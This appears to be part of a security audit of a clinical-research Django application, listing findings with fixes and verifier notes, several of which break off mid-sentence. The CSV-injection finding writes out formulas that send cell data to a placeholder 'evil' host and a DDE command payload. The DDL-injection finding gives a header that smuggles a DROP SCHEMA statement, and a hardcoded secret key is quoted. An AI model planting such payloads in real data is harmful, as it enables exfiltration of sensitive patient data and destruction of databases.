> _Verifier note:_ Verified against the real project at /Users/pot95a/2026/new_chiron/is4r-chiron-develop/ (the benchmark cwd only contains the harness; files resolved via search). test_project/project/settings.py:26 is exactly `SECRET_KEY = "1b_762p=(t97y-(y!@2pp5hzq*z)*va*e*akjuu_==#om4a8oe"` — a hardcoded literal in the runnable demo config (chiron_demo, DEBUG=True), overridable only via optional settings_custom import (line 157), so a deployment that fails to override inherits it. chiron/processors/etl/auto_subject_id.py confirms the dual use: EtlGeneratedSubjectId sets self.salt = getattr(settings, "SECRET_


### 11. 🟧 MEDIUM — CSV formula (spreadsheet) injection in cohort/report/pivot exports

- **Category:** csv-formula-injection  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/utils/export.py:104 and :106 (generate_cohort_csv); :139-142 (generate_pivottable_csv); header build at :92-98 and :153-159 (generate_cohort_json)`

**What it is.** The export helpers write research data straight into CSV cells with no formula neutralization. In generate_cohort_csv (chiron/api/utils/export.py:103-106) a csv.writer emits header_names then, for each row in the query result, `writer.writerow(row)` verbatim. generate_pivottable_csv (:139-142) does the same on `querytool.run_analysis(analysis).to_csv()` output. No cell value is checked for a leading =, +, -, @, tab, or carriage return, and I confirmed there is no sanitize/escape/formula-neutralization routine anywhere under chiron/ (grep for 'formula\|sanitize\|escape.*csv\|neutraliz\|startswith' returns nothing relevant). header_names are also user-controlled: they come from the table def field `alias` (falling back to `label`) at :95-98. Both endpoints are HTTP-reachable to authenticated users: chiron/api/viewsets/report_tools.py:132-149 (export_csv action), chiron/api/viewsets/query_tools.py:93, chiron/api/viewsets/analysis_tools.py:123, and chiron/api_v2/viewsets/report_tools.py:147. The exported values originate from ingested source data (e.g. CSV/REDCap free-text fields loaded via chiron/processors/source/csv.py and the ETL pipeline) and from user-set field aliases, i.e. content an attacker who can influence source data or a saved report can control.

**Impact.** A malicious cell value such as =HYPERLINK("http://evil/?d="&A1&A2,"click"), =WEBSERVICE("http://evil/"&A1), or a legacy DDE payload (=cmd\|'/c calc'!A1) is written unescaped. When a researcher opens the exported CSV in Excel, LibreOffice, or Google Sheets the formula executes: silent exfiltration of adjacent patient-like data to an attacker URL, phishing hyperlinks, or (with DDE and macro settings) local command execution on the analyst's workstation. Because this is a clinical-research tool, the data pulled by the injected formula is exactly the sensitive cohort data.

**Fix.** Apply formula neutralization to every header and data cell before writing, in generate_cohort_csv and generate_pivottable_csv (and to header_names in generate_cohort_json). Caveat on the proposed helper: blindly prefixing any value whose first char is '-' will turn legitimate negative numbers (common in lab/clinical data) into text strings and corrupt the dataset. Refine so numeric-looking values are left intact, e.g.:  def _csv_safe(v):     s = '' if v is None else str(v)     if not s:         return s     if s[0] in ('=', '+', '@', '\t', '\r'):         return "'" + s     if s[0] == '-':         # only neutralize if it is NOT a plain negative number         try:             float(s)         except ValueError:             return "'" + s     return s  Use `writer.writerow([_csv_safe(c) for c in header_names])` and `writer.writerow([_csv_safe(c) for c in row])`. For the pivot table, stop the naive `dataset.split('\n')` / `row.split(',')` parsing entirely: obtain the DataFrame from run_analysis and write it with pandas (df.to_csv(response, index=..., quoting=csv.QUOTE_MINIMAL)) after applying _csv_safe to string cells, so comma-containing values are correctly quoted.

> _Verifier note:_ Every code claim checks out against /Users/pot95a/2026/new_chiron/is4r-chiron-develop/chiron/api/utils/export.py. In generate_cohort_csv (lines 101-107): a csv.writer emits header_names (line 104) then loops `for row in dataset: writer.writerow(row)` (lines 105-106) with zero neutralization. header_names are built from user-controllable field metadata `alias` falling back to `label` (lines 92-98). generate_pivottable_csv (lines 136-143) takes querytool.run_analysis(analysis).to_csv(), splits on newlines, then `row.split(",")` and writerow verbatim (lines 140-142). generate_cohort_json builds t


### 12. 🟧 MEDIUM — Missing and misspelled HTTP security headers (broken HSTS, no CSP/X-Frame-Options/nosniff)

- **Category:** security-headers  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/nginx.conf:28 (and absence throughout nginx.conf / index.html)`

**What it is.** nginx.conf:28 sets `add_header Strict-Transprot-Securty max-age=2592000;` — the header name is misspelled ('Strict-Transprot-Securty' instead of 'Strict-Transport-Security'), so browsers receive an unknown header and no HSTS is enforced; the value also lacks includeSubDomains. Beyond that, the server sets no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, and no Referrer-Policy (confirmed: grep for content-security-policy across nginx.conf, index.html and src returns nothing). For an app handling patient-like data this leaves it without transport pinning, without clickjacking protection, and with no CSP to blunt the XSS sink above.

**Impact.** No HSTS (downgrade/SSL-strip exposure), clickjacking via framing, MIME-sniffing risk, and referrer leakage. Absence of CSP removes the main defense-in-depth control that would contain the stored-XSS finding in query.tsx.

**Fix.** Correct the typo and set a proper value, and place the headers where they are actually emitted. Because the `location /` block defines its own add_header (dropping inherited ones) and error responses need coverage, use the `always` flag and repeat the security headers inside `location /` (or move all of them into a shared snippet included in both). Example inside the location that serves index.html: add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always; add_header X-Content-Type-Options "nosniff" always; add_header X-Frame-Options "DENY" always; add_header Referrer-Policy "strict-origin-when-cross-origin" always; add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'" always; Note that HSTS is only honored on HTTPS responses, so ensure TLS is terminated at or in front of this server before relying on it. Test the CSP against the app's actual script/style/connect origins (Vite build, /api backend) before enforcing.

> _Verifier note:_ Read /Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/nginx.conf directly. Line 28 is verbatim `add_header Strict-Transprot-Securty max-age=2592000;` — the header name is misspelled twice ('Transprot' should be 'Transport', 'Securty' should be 'Security'), so browsers receive an unrecognized custom header and no HSTS is applied; the value also omits includeSubDomains. Confirmed the absence of other controls: grep -riE for content-security-policy\|x-frame-options\|x-content-type\|referrer-policy across nginx.conf, index.html and src returns nothing, and the case-insensitive 'strict-transpor


### 13. 🟧 MEDIUM — user_report lists all users across all datasets and enables unrestricted 'view as' impersonation of any user id

- **Category:** broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-develop/chiron/views/views_backend.py:209-225 (qChironUser=ChironUser.objects.all() at 221; override at 216-220) and stop_viewing_as_user:196-203; is4r-chiron-develop/chiron/middleware/view_as_other_user.py:15-24`

**What it is.** user_report builds models.ChironUser.objects.all() (views_backend.py:221) with no filter on request.dataset, so a staff user of one dataset sees every other dataset's ChironUsers -- usernames, full names, last_login, access_level, and permission-group membership. The same view accepts POST override_user_id and stores it in the session (216-219); the ViewAsOtherUser middleware then unconditionally sets request.user = User.objects.filter(id=override_user_id).first() for any id (view_as_other_user.py:18-23), with no check that the target belongs to the same dataset or is not higher-privileged (including superusers). Combined with the ETL-log gap above, a staff user whose own tier is DEID/AGG can impersonate a PHI user and inherit that user's data access. (Minor robustness note: int(request.POST.get('override_user_id', None)) at line 217 raises TypeError -> 500 when the field is absent.)

**Impact.** Cross-dataset disclosure of user account metadata, and a privilege/identity-escalation path: any staff account (or a hijacked staff session) can assume any other user's identity and data-access level, defeating per-user PHI/DEID/AGG restrictions. This is a session-persisted impersonation, not a one-off.

**Fix.** 1) Scope the listing: qChironUser = models.ChironUser.objects.filter(dataset=request.dataset).order_by('-user__last_login'). 2) Guard the cast and validate the target at the setting site (request.dataset is available there): raw = request.POST.get('override_user_id'); if not raw or not raw.isdigit(): return HttpResponseBadRequest(). Resolve the target only among users with a ChironUser in request.dataset: target_cu = models.ChironUser.objects.filter(dataset=request.dataset, user_id=int(raw)).first(); reject if None. Forbid impersonating a user whose access_level exceeds the requester's or whose Django user is_superuser/is_staff. Only then set request.session['override_user_id']. 3) Optionally gate view-as behind an explicit, non-inherited permission rather than the global is_staff flag, and (since ViewAsOtherUser runs before dataset_selector) keep the dataset/privilege validation at the user_report set-point, not in the middleware.

> _Verifier note:_ All cited code verified. views_backend.py:221 uses models.ChironUser.objects.all() with no dataset filter; ChironUser has a dataset FK (user_models.py:86), so the report (rendered by user_report.html:34-55: name, is_staff, date_joined, last_login, access_level, permission groups) discloses account metadata for users of every dataset to any staff user — unconditional. views_backend.py:216-219 stores POSTed override_user_id in the session. view_as_other_user.py:18-23 then sets request.user = User.objects.filter(id=override_user_id).first() for ANY id with no same-dataset, no access_level, and no


### 14. 🟧 MEDIUM — DDL/identifier injection via unvalidated metadata identifiers (schema/table/column names) in raw f-string DDL

- **Category:** sql-injection  
- **Verification:** CONFIRMED  
- **Location:** `chiron/query_engine/postgres/db_writer.py:78,88,91,144,153,156,385,449-452,463-466; chiron/query_engine/postgres/database.py:54; source of tainted identifiers: chiron/data_dictionary/csv_autocreate.py:62-66,96-99,249-250`

**What it is.** The ETL/DDL code builds SQL by directly interpolating metadata identifiers into raw text() strings, not via bound parameters or a proper identifier quoter. Examples: db_writer.py:78 `sql = f'TRUNCATE TABLE "{schema_name}".{collection.permanent_id} RESTART IDENTITY'` then `conn.execute(text(sql))` (collection.permanent_id is completely UNQUOTED); db_writer.py:88/91 `f'DROP SCHEMA IF EXISTS "{schema_name}" CASCADE'` / `f'CREATE SCHEMA "{schema_name}"'`; db_writer.py:144/153/156 `ALTER/DROP SCHEMA "{...}"`; db_writer.py:385 `f'DROP TABLE IF EXISTS "{schema_name}".concept_search'`; db_writer.py:449-452/463-466 `CREATE INDEX IF NOT EXISTS {index_name} ON "{schema_name}"."{table_name}" ("{oConcept.permanent_id}")` (index_name is UNQUOTED, and the column/table names rely only on a single pair of double quotes with no escaping of embedded quotes). database.py:54 `options_str = "-csearch_path={}".format(schema_name)` injects the schema into the libpq connection options string (an embedded space would let an attacker append arbitrary `-c` server options). These identifiers derive from Django SlugField columns (data_definition_models.py:57 database_name, :371/:879 permanent_id, :53 unique_id) whose charset [-a-zA-Z0-9_] would, IF ENFORCED, make injection impossible. But Django SlugField validators only run on full_clean()/ModelForm.is_valid(); a repo-wide grep shows full_clean is never called (only a commented-out clean_fields at data_definition_models.py:445), and SlugField creates a plain varchar with no DB CHECK constraint. The programmatic creation paths bypass validation entirely: csv_autocreate.py:249-250 sets `oConcept.permanent_id = '{}_{}'.format(field_name, random_string())` where field_name is a raw CSV column header, then csv_autocreate.py:299 calls `.save()` directly (no full_clean); csv_autocreate.py:62-66 creates a Dataset with `database_name=dataset_name` from ETL settings; csv_autocreate.py:96-99 sets Collection.permanent_id from settings. Data flow to sink: crafted CSV column header (e.g. `evt") ; DROP SCHEMA public CASCADE; --`) -> Concept.permanent_id -> db_writer.create_indexes() f-string DDL -> text()/execute during ETL. Because these are DDL statements run by a DB role that owns every dataset schema, successful injection can drop or alter arbitrary schemas (including other datasets') or run arbitrary SQL.

**Impact.** An actor able to influence source data loaded during ETL (crafted CSV headers) or ETL config values (database_name / collection ids) can inject arbitrary DDL/SQL that executes with the warehouse-owner role, enabling destruction or tampering of any dataset schema in the Postgres warehouse. This is an ETL/data-curation trust-boundary issue, not reachable by an ordinary authenticated API user, which is why it is Medium rather than Critical. The SlugField gives a false sense of safety because its validation is never actually enforced on the paths that ingest external strings.

**Fix.** Adopt the proposed fix. Priorities: (1) In db_writer.create_indexes, stop interpolating raw identifiers — quote index_name, table_name, schema_name and the column name with engine.dialect.identifier_preparer.quote()/quote_schema() (or build the DDL with psycopg.sql.Identifier); index_name at line 449/463 and collection.permanent_id at line 78 are currently fully unquoted and are the primary injection sinks. (2) Enforce the slug constraint at the trust boundary: in csv_autocreate.py before .save(), run full_clean() or django.core.validators.validate_slug on Concept/Collection/Dataset, or apply re.fullmatch(r'[A-Za-z0-9_]+', name) to field-derived identifiers before they become permanent_id. (3) In database.py:54 validate schema_name against the slug allowlist so no whitespace can inject additional libpq -c options. Defense in depth: since these are DDL that cannot use bound parameters, the identifier quoter plus an allowlist is the correct combination.

> _Verifier note:_ Every cited location was opened and matches the claim. chiron/query_engine/postgres/db_writer.py builds DDL by raw f-string interpolation of metadata identifiers and runs it via conn.execute(text(sql)): line 78 TRUNCATE with collection.permanent_id UNQUOTED; lines 88/91/144/153/156 DROP/CREATE/ALTER SCHEMA "{...}"; line 385 DROP TABLE; and lines 449-452/463-466 CREATE INDEX IF NOT EXISTS {index_name} where index_name = f"idx_{oConcept.permanent_id}" (line 438) is COMPLETELY UNQUOTED and the column reference ("{oConcept.permanent_id}") uses one pair of double quotes with no escaping of embedded


### 15. 🟨 LOW — Concept retrieve returns concept metadata without dataset check (low-sensitivity cross-dataset leak)

- **Category:** idor-broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/viewsets/concept.py:157 (retrieve), :190 (update)`

**What it is.** retrieve/update fetch `get_object_or_404(models.Concept, permanent_id=permanent_id)` and return serializer.data directly, bypassing get_queryset() (concept.py:55-112) which filters by published and per-user user_can_view_concept_stats(). Concept.permanent_id is globally unique (data_definition_models.py:879) and concepts are dataset-scoped only via collection.dataset (data_definition_models.py:896), so a user in one dataset can read another dataset's concept metadata (name, description, has_phi flag, options) by permanent_id (a guessable slug). The sensitive path — statistics/cohort options — is separately re-gated by user_can_view_concept_stats(), which DOES enforce the dataset boundary (data_definition_models.py:1101) and permission groups, so aggregate/statistical data is NOT leaked; only static schema metadata is.

**Impact.** Minor schema/field-description disclosure across datasets. No patient data or statistics exposed because the statistics/options code paths re-check user_can_view_concept_stats().

**Fix.** Scope the lookup to the active dataset in both retrieve and update: article = get_object_or_404(models.Concept.objects.filter(collection__dataset=request.dataset), permanent_id=permanent_id). The proposed fix is valid since request.dataset is populated by DatasetSelector. A stronger, more consistent alternative is to fetch via self.get_queryset() (article = get_object_or_404(self.get_queryset(), permanent_id=permanent_id)), which additionally applies the published + user_can_view_concept_stats filtering already used by list(), yielding a 404 for any concept the user cannot view rather than only enforcing the dataset boundary.

> _Verifier note:_ Verified all cited locations. concept.py:157 (retrieve) and :190 (update) call get_object_or_404(models.Concept, permanent_id=permanent_id) directly on the unfiltered manager and return serializer.data — they neither route through get_queryset() (concept.py:55-112, which filters published + user_can_view_concept_stats) nor call self.get_object(), so DRF's check_object_permissions is also never invoked. permanent_id is a globally unique SlugField (data_definition_models.py:879), and dataset scoping exists only via collection.dataset (concept FK at :896; ConceptManager.accessible at :869 filters


### 16. 🟨 LOW — Reference/demo Django settings omit all session, CSRF, and transport security flags

- **Category:** insecure-config  
- **Verification:** PLAUSIBLE (severity adjusted from medium)  
- **Location:** `test_project/project/settings.py (no SESSION_COOKIE_SECURE / CSRF_COOKIE_SECURE / SECURE_SSL_REDIRECT / SECURE_HSTS_SECONDS anywhere; grep across test_project/ and chiron/ returns none)`

**What it is.** The settings define no cookie- or transport-hardening at all, so all of SESSION_COOKIE_SECURE, CSRF_COOKIE_SECURE, SECURE_SSL_REDIRECT, and SECURE_HSTS_SECONDS fall back to their insecure Django defaults (False / 0). Session and CSRF cookies will therefore be transmitted over plain HTTP. This is the reference project consumers start from; combined with DEBUG=True (settings.py:29), a deployment based on it would leak cookies and tracebacks. (SESSION_COOKIE_HTTPONLY defaults to True, which is fine.)

**Impact.** Session/CSRF cookies sent over HTTP are interceptable on the network; for patient-like data this enables session hijacking. Demo/reference config, but the pattern propagates to real deployments.

**Fix.** Leave the test project as dev-only (it is self-labeled unsuitable for production). Put the hardening in a production settings module instead: the file already provides the override hook `from .settings_custom import *` (l.156-159) and a separate performance_project settings exists. In that production module set SESSION_COOKIE_SECURE=True, CSRF_COOKIE_SECURE=True, SECURE_SSL_REDIRECT=True, and SECURE_HSTS_SECONDS>0 with SECURE_HSTS_INCLUDE_SUBDOMAINS=True, and document running `manage.py check --deploy`. Do not hardcode these True in the shared dev settings, which would break local HTTP work.

> _Verifier note:_ Verified is4r-chiron-develop/test_project/project/settings.py (cited path; not in benchmark cwd but in the sibling chiron repo). The file genuinely contains no SESSION_COOKIE_SECURE / CSRF_COOKIE_SECURE / SECURE_SSL_REDIRECT / SECURE_HSTS_SECONDS — grep across test_project/ and chiron/ returned zero matches — and DEBUG=True is on line 29 as claimed. SessionMiddleware (l.56) and CsrfViewMiddleware (l.58) are enabled, so those flags fall back to Django's insecure defaults. So the technical condition described is factually accurate. However, the severity is over-claimed: this is explicitly a dev/


### 17. 🟨 LOW — Vite dev server sets Access-Control-Allow-Origin: * (dev-only)

- **Category:** insecure-config  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/vite.config.ts:11-13`

**What it is.** server.headers sets 'Access-Control-Allow-Origin': '*' on the Vite dev server. This applies only to the local dev server (port 3000) and is not emitted by the production build served through nginx, so it does not affect deployed instances. While a developer is running the dev server, any origin the developer browses to could read responses proxied through it (which forwards /api, /admin, /accounts to the Django backend at 127.0.0.1:8000).

**Impact.** Limited to developer machines running the dev server; a malicious site visited during development could read proxied backend responses cross-origin.

**Fix.** Delete the `headers` block (lines 11-13) so `server` contains only `port` and `proxy`; the SPA-to-proxy same-origin flow needs no CORS header. If a specific cross-origin dev tool requires it, replace `"*"` with an explicit allowlist of localhost origins. Note that the practical exposure is confined to unauthenticated proxied responses, since `*` cannot expose cookie-authenticated backend data.

> _Verifier note:_ At /Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/vite.config.ts lines 9-22, the config returns a `server` block (dev-server-only in Vite; production/`preview` are unaffected) that binds port 3000 and, at lines 11-13, sets header `"Access-Control-Allow-Origin": "*"`. The same block (lines 14-21) proxies /admin, /api, /accounts, /backend, /ajax, /static to the Django backend at http://127.0.0.1:8000. So the finding's factual claims are all accurate: wildcard CORS on the dev server only, proxying to the local backend, no impact on the nginx-served production build. Exploitability is genuin


### 18. 🟨 LOW — requests lower bound (>=2.26.0) permits multiple credential-leak CVEs

- **Category:** dependency-cve  
- **Verification:** CONFIRMED (severity adjusted from medium)  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.txt:6 (also setup.py:19, unversioned)`

**What it is.** base.txt pins `requests>=2.26.0,<3`. Everything from 2.26.0 up to the 2.32.x line is permitted, which includes versions with three known CVEs: CVE-2023-32681 (Proxy-Authorization header leaked to the destination host across an HTTPS->HTTP / cross-origin redirect; affects 2.3.0-2.30.0, fixed 2.31.0); CVE-2024-35195 (once a request to a host is made with verify=False, all later requests to that host in the same Session silently skip TLS verification; fixed 2.32.0); CVE-2024-47081 (.netrc credentials can be exfiltrated to an attacker-controlled host via a crafted URL; fixed 2.32.4). setup.py:19 lists `requests` with no version at all. INFERENCE: there is no Python lockfile and CI installs latest-in-range, so a fresh build likely gets a patched 2.32.x; the floor is what is unsafe, not necessarily the running version.

**Impact.** For a tool handling clinical/human-subject data that makes outbound HTTP calls, the permitted floor allows silent TLS-verification bypass and leakage of proxy/.netrc credentials to third parties on redirect. Exploitable only if a vulnerable version is actually resolved (e.g. pip cache, internal mirror, or an external --constraint pinning an older release).

**Fix.** Raise the floor in both places: `requests>=2.32.4,<3` in requirements/base.txt:6 and add the same specifier for `requests` in setup.py install_requires. Because setup.py currently has no version constraint at all, pinning it there is the higher-value change. Pair with a generated lockfile (pip-compile/uv) so the resolved version is deterministic across environments.

> _Verifier note:_ Verified base.txt:6 = `requests>=2.26.0,<3` and setup.py:19 = bare `requests` in install_requires. No lockfile exists (requirements/ holds only base.txt, dev.txt, docs.txt, ontologies.txt; no *.lock/Pipfile/poetry.lock/constraints), so resolution is unpinned — the finding's premise is accurate. The three CVEs and their fix versions are correct, and the 2.26.0 floor sits below all three fix lines (2.31.0 / 2.32.0 / 2.32.4), so the specifier genuinely permits vulnerable releases. However, the installed version in .venv is requests-2.34.2 (fully patched), which confirms the finding's own caveat t


### 19. 🟨 LOW — Django lower bound (>=3.2.23) permits an end-of-life, unpatched release series

- **Category:** dependency-cve  
- **Verification:** CONFIRMED (severity adjusted from medium)  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.txt:1 (also setup.py:14, unversioned)`

**What it is.** base.txt pins `django>=3.2.23,<6`. Django 3.2 reached end of extended support in April 2024, so the entire 3.2 floor receives no further security patches. 3.2.23 specifically predates the last two 3.2 releases and is missing their fixes: CVE-2024-24680 (denial of service in the `intcomma` handling / date parsing, fixed in 3.2.24) and CVE-2024-27351 (regular-expression denial of service in `django.utils.text.Truncator.words()`, fixed in 3.2.25). setup.py:14 lists `django` with no bound whatsoever. INFERENCE: with no lockfile, a fresh install resolves to the newest release under 6.0 (a supported 5.x at the 2026 cutoff), so the running version is probably fine; the danger is that the floor lets a build land on an EOL, unsupported series with no guardrail failing.

**Impact.** Nothing prevents a deployment (pip cache, offline mirror, transitive constraint) from resolving to an EOL Django with unpatched DoS vulnerabilities and no security support. For a clinical data application the framework should never be allowed to float down to an unsupported series.

**Fix.** Raise the floor to a supported LTS and mirror it in setup.py: base.txt -> `Django>=4.2.16,<6` (or `>=5.2,<6`), and setup.py install_requires -> `"django>=4.2.16,<6"`. Add a lockfile (pip-tools compiled requirements or equivalent) so the exact supported version is pinned for reproducible builds. This is a hygiene/defense-in-depth improvement rather than a fix for an active vulnerability, since the resolved version (5.2.16) is already supported.

> _Verifier note:_ All cited facts verified against source. base.txt:1 reads verbatim `django>=3.2.23,<6`; setup.py:14 reads `"django"` with no version bound. No lockfile exists anywhere in the repo (checked requirements/ and root — only base/dev/docs/ontologies .txt, none exact-pinned), so the >=3.2.23 floor is the only guardrail. The CVE mapping is accurate: CVE-2024-24680 (intcomma DoS) fixed in 3.2.24 and CVE-2024-27351 (ReDoS in Truncator.words()) fixed in 3.2.25, and Django 3.2 did reach end of extended support in April 2024, so 3.2.23 is EOL/unpatched. The floor therefore does technically permit installin


### 20. 🟨 LOW — djangorestframework lower bound (>=3.12.4) permits browsable-API XSS (CVE-2024-21520)

- **Category:** dependency-cve  
- **Verification:** PLAUSIBLE (severity adjusted from medium)  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.txt:2 (also setup.py:15, unversioned)`

**What it is.** base.txt pins `djangorestframework>=3.12.4,<4`. Versions below 3.15.2 are affected by CVE-2024-21520, a reflected cross-site-scripting flaw in the Browsable API (unescaped rendering via the `break_long_headers` template filter). The floor 3.12.4 is well inside the vulnerable range, and setup.py:15 lists `djangorestframework` unversioned. INFERENCE: a fresh install resolves to a patched 3.15.x/3.16.x; the floor is the exposure. Impact is contingent on the Browsable API renderer being enabled in production.

**Impact.** If a vulnerable DRF is resolved and the Browsable API is reachable, an attacker can reflect script into a researcher/clinician's authenticated session (session/token theft, actions in the victim's context). Mitigated in practice if the Browsable renderer is disabled in prod, but the floor should not permit the vulnerable code at all.

**Fix.** Tighten the floor in requirements/base.txt to `djangorestframework>=3.15.2,<4` so the vulnerable range can never be resolved, and add the same lower bound (`djangorestframework>=3.15.2`) in setup.py:15. As defense in depth, confirm the Browsable API renderer (rest_framework.renderers.BrowsableAPIRenderer) is not in DEFAULT_RENDERER_CLASSES for production settings. Consider committing a lockfile (pip-tools/requirements.lock) so the actually-resolved version is auditable.

> _Verifier note:_ Both cited locations verified. base.txt:2 contains exactly `djangorestframework>=3.12.4,<4`; the floor 3.12.4 with upper bound <4 does permit the full sub-3.15.2 range affected by CVE-2024-21520 (reflected XSS in DRF's Browsable API via the break_long_headers filter, patched in 3.15.2). setup.py:15 lists `djangorestframework` unversioned in install_requires, imposing no floor. The factual claim about the constraint is correct. However, exposure is doubly contingent and not verifiable from source: (1) there is no lockfile, so a fresh install resolves to a patched 3.15.x/3.16.x — no vulnerable c


### 21. 🟨 LOW — No Python dependency lockfile — backend versions are unpinned/unverifiable and drift

- **Category:** supply-chain  
- **Verification:** CONFIRMED (severity adjusted from medium)  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.txt, dev.txt, docs.txt; setup.py:13-25; CI at .github/workflows/lint_and_test.yml:33`

**What it is.** The backend has only range-based requirements files and no lockfile (no requirements.txt with hashes, no Pipfile.lock, no poetry.lock, no constraints file — confirmed by directory listing). CI runs `pip install -r requirements/dev.txt` (lint_and_test.yml:33) with no pinning, so every build resolves latest-in-range and the exact dependency set is neither reproducible nor auditable. Several packages carry no upper bound or no version at all: `psycopg2-binary` (base.txt:4, fully unpinned), `pandas` (base.txt:7, fully unpinned), `natsort` (base.txt:8), and every line in docs.txt (sphinx, sphinx-django-command, sphinx-rtd-theme, sphinxcontrib-mermaid, myst-parser — all unpinned). setup.py:13-25 lists the entire install_requires with no version specifiers and even includes `numpy`, which is absent from base.txt, so `pip install .` and `pip install -r requirements/base.txt` produce different dependency sets.

**Impact.** Builds are non-reproducible; a compromised or yanked upstream release, or a newly disclosed CVE, silently enters production with no pinned baseline to detect or roll back to. Security review cannot state what is actually deployed. Divergence between setup.py and requirements/*.txt means the audited manifest may not match an installed one.

**Fix.** Adopt pip-tools: maintain the human-edited requirements/*.in files and generate pinned, hashed lockfiles via `pip-compile --generate-hashes` (e.g., requirements/base.txt as compiled output), then have CI install with `pip install --require-hashes -r requirements/dev.txt`. Add upper bounds to psycopg2-binary and pandas in the source manifest. Either delete setup.py's redundant/unpinned install_requires or reconcile it with base.txt (add numpy to base.txt or drop it from setup.py) so the audited manifest matches what is installed. Add a scheduled pip-audit or Dependabot scan against the committed lockfile. Prioritize base.txt (production) over docs.txt (docs-build only) and dev.txt (CI only).

> _Verifier note:_ All cited locations were opened and every factual claim verified. requirements/ contains only base.txt, dev.txt, docs.txt, ontologies.txt; a find for *.lock, Pipfile*, poetry.lock, constraints*.txt, and any requirements.txt returned nothing — no lockfile and no hashes exist. .github/workflows/lint_and_test.yml:33 runs `pip install -r requirements/dev.txt` with no pinning/--require-hashes. In base.txt, line 4 `psycopg2-binary`, line 7 `pandas`, and line 8 `natsort` are fully unpinned (SQLAlchemy>=2, python-dateutil>=2.8.0, unicodecsv>=0.14.1 have lower but no upper bounds). docs.txt lines 4-8 (


### 22. 🟨 LOW — unicodecsv is unmaintained and redundant on Python 3

- **Category:** outdated-package  
- **Verification:** CONFIRMED  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.txt:10`

**What it is.** base.txt pins `unicodecsv>=0.14.1`. unicodecsv is a Python-2-era backport whose last release (0.14.1) is from ~2017 and is effectively abandoned; on Python 3 (the project targets py312 per pyproject.toml:38 and CI runs 3.11-3.13) the standard-library `csv` module already handles unicode, so the dependency is unnecessary. No specific CVE, but an unmaintained package will never receive a fix if one is ever needed and is a needless supply-chain surface.

**Impact.** Dependence on an abandoned package with no upstream security response path. Low direct risk, but it should be removed rather than carried and pinned.

**Fix.** Remove unicodecsv from both requirements/base.txt:10 and setup.py:23, then migrate the three call sites to the stdlib csv module. In chiron/processors/source/csv.py:93-96 and chiron/data_dictionary/csv_autocreate.py:171,202, replace `open(path, "rb")` + `unicodecsv.DictReader(f, encoding=...)` with `open(path, newline="", encoding=self.encoding)` + `csv.DictReader(f, delimiter=...)`, and update the module imports from `import unicodecsv` to `import csv`. Verify the delimiter/encoding arguments are preserved and that downstream consumers expect str keys/values (which csv yields natively).

> _Verifier note:_ Verified base.txt:10 pins `unicodecsv>=0.14.1`; pyproject.toml:38 sets target-version=py312, confirming Py3-only targeting. unicodecsv is a Python-2-era backport whose final release (0.14.1) is abandoned, and Python 3's stdlib csv handles unicode natively, so the dependency is redundant. The package is actually used, not just pinned: `import unicodecsv` and `unicodecsv.DictReader` at chiron/processors/source/csv.py:1,94 and chiron/data_dictionary/csv_autocreate.py:1,171,202, and it is also declared in setup.py:23. These call sites open files in binary mode and pass encoding= to DictReader, whi


### 23. 🟨 LOW — Ontology dependency pinned to a mutable git tag over the network

- **Category:** supply-chain  
- **Verification:** CONFIRMED  
- **Location:** `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/ontologies.txt:2`

**What it is.** The optional ontologies extra installs `git+https://github.com/cchmc/is4r-chiron-ontology.git@v1.0.0#egg=ontologies` (mirrored in setup.py:27-29). It is pinned to a git tag rather than an immutable commit SHA. Tags are movable, so anyone able to re-point v1.0.0 in that repo changes what every build installs, and there is no hash verification. This is a source dependency fetched and (potentially) executed at install/runtime.

**Impact.** A moved tag or a compromise of the source repo would inject arbitrary code into installs with no integrity check to detect it. Scope is limited because it is an optional extra and the repo is org-controlled.

**Fix.** Pin to a full 40-char commit SHA (`...@<sha>#egg=ontologies`) in both ontologies.txt and setup.py. Better: publish the ontology package to an internal PyPI-style index and pin an exact version with hashes (e.g., pip --require-hashes with a lockfile / hash-pinned requirement) so integrity is verified at install.

> _Verifier note:_ Read both cited files. requirements/ontologies.txt:2 contains exactly `git+https://github.com/cchmc/is4r-chiron-ontology.git@v1.0.0#egg=ontologies`, and setup.py lines 26-30 mirror it under extras_require["ontologies"] as `"ontologies @ git+https://github.com/cchmc/is4r-chiron-ontology.git@v1.0.0#egg=ontologies"`. The dependency is pinned to the mutable git tag v1.0.0 rather than an immutable commit SHA, is fetched over the network at install time, and has no hash/integrity verification. A moved tag or repo compromise would inject unverified code. The finding's mitigations are also accurate: i


### 24. 🟨 LOW — Path traversal / arbitrary file read-write in backup & restore commands

- **Category:** path-traversal  
- **Verification:** CONFIRMED  
- **Location:** `chiron/helpers.py:149 (prepare_backup_file_path); consumed at chiron/management/commands/chiron_restore_dataset.py:90-93 and chiron/management/commands/chiron_backup_dataset.py:72,163`

**What it is.** prepare_backup_file_path builds the target path as `os.path.join(backup_dir, filename)` (chiron/helpers.py:149) with no validation that the result stays inside the backup directory. `filename` is taken directly from the CLI positional arg (chiron_restore_dataset.py:52-55, :85) and `backup_dir` from --backup-dir (:61-66). Because os.path.join treats an absolute component as a reset, `manage.py chiron_restore_dataset /etc/anything.json` reads that absolute path (opened and json.load'd at restore_dataset.py:92-93), and `../` segments in a relative filename escape CHIRON_DATA_DICT_BACKUP_DIR (default 'chiron_config/backups'). The backup command's `open(filepath, 'w')` (chiron_backup_dataset.py:163) will likewise write JSON to a traversed/absolute path.

